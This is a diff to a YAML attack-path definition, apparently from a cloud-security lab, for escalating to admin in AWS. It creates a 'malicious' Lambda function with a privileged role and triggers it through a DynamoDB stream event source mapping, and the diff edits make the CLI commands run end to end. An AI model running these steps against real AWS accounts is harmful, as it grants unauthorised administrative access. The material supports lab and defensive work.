@@ -95,7 +95,7 @@ attackMap:
             EOF
             cd /tmp && zip lambda_payload.zip lambda_function.py
         - description: "Create Lambda function with privileged role"
-          command: "aws lambda create-function --function-name pl-prod-lambda-002-malicious-lambda --runtime python3.12 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-admin-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_payload.zip --environment Variables={TARGET_USER=pl-prod-lambda-002-to-admin-starting-user}"
+          command: "ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text) && aws lambda create-function --function-name pl-prod-lambda-002-malicious-lambda --runtime python3.12 --role arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-002-to-admin-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_payload.zip --environment Variables={TARGET_USER=pl-prod-lambda-002-to-admin-starting-user}"
 
     - from: lambda-function
       to: dynamodb-stream
@@ -105,13 +105,14 @@ attackMap:
         to the DynamoDB table's stream. This causes the Lambda to execute automatically
         whenever records are written to the table — no InvokeFunction permission needed.
       hints:
-        - "Use lambda:CreateEventSourceMapping with the DynamoDB table's LatestStreamArn and --starting-position LATEST to connect the function to the stream without needing lambda:InvokeFunction."
-        - "Poll lambda:GetEventSourceMapping until the mapping state reaches 'Enabled' before triggering -- it starts in 'Creating'."
+        - "Use lambda:CreateEventSourceMapping with the DynamoDB table's LatestStreamArn and --starting-position TRIM_HORIZON to connect the function to the stream without needing lambda:InvokeFunction. Poll lambda:GetEventSourceMapping until the mapping state reaches 'Enabled'. TRIM_HORIZON delivers records that were already in the stream, so the trigger record cannot be missed; the mapping's poller still takes up to about two minutes to read the stream after 'Enabled'."
       commands:
         - description: "Get the DynamoDB stream ARN"
-          command: "aws dynamodb describe-table --table-name pl-prod-lambda-002-to-admin-trigger-table --query 'Table.LatestStreamArn' --output text"
+          command: "STREAM_ARN=$(aws dynamodb describe-table --table-name pl-prod-lambda-002-to-admin-trigger-table --query 'Table.LatestStreamArn' --output text)"
         - description: "Create event source mapping to trigger Lambda from DynamoDB stream"
-          command: "aws lambda create-event-source-mapping --function-name pl-prod-lambda-002-malicious-lambda --event-source-arn <stream-arn> --starting-position LATEST"
+          command: "UUID=$(aws lambda create-event-source-mapping --function-name pl-prod-lambda-002-malicious-lambda --event-source-arn \"$STREAM_ARN\" --starting-position TRIM_HORIZON --query 'UUID' --output text)"
+        - description: "Poll until the event source mapping is Enabled"
+          command: "aws lambda get-event-source-mapping --uuid \"$UUID\" --query 'State' --output text"
 
     - from: dynamodb-stream
       to: target-role
